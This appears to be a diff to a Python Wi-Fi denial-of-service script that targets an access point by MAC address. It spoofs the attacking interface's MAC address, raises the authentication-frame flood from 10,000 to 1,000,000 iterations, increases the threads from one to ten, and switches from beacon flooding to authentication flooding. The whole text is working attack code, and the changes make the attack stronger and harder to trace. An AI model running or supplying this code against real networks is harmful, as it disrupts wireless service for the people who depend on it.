@@ -15,6 +15,8 @@ wlan_monitor_if	= sys.argv[1]
 ap_mac		= sys.argv[2]
 
 print("interface/ap: %s %s" % (wlan_monitor_if, ap_mac))
+utils.set_wlan_monmode(wlan_monitor_if, monitor_active=False, reactivate=False)
+utils.set_ethernet_address(wlan_monitor_if, "24:77:03:01:5C:8D")
 utils.set_wlan_monmode(wlan_monitor_if, monitor_active=True)
 
 psocket		= psocket.SocketHndl(wlan_monitor_if)
@@ -39,7 +41,7 @@ def send_auth(mac):
 	auth_req = copy.deepcopy(auth_req_orig)
 	start_time = time.time()
 
-	for i in range(10000):
+	for i in range(1000000):
 		if i % 500 == 0:
 			diff = time.time() - start_time
 			print("%d pps" % (i / diff) )
@@ -96,10 +98,10 @@ def send_beacon(_):
 			pass
 
 print("starting DOS attack on AP %s" % ap_mac)
-amount_threads = 1
+amount_threads = 10
 threads = []
-#dos_method=send_auth
-dos_method=send_beacon
+dos_method=send_auth
+#dos_method=send_beacon
 
 print("creating threads")
 for x in range(amount_threads):
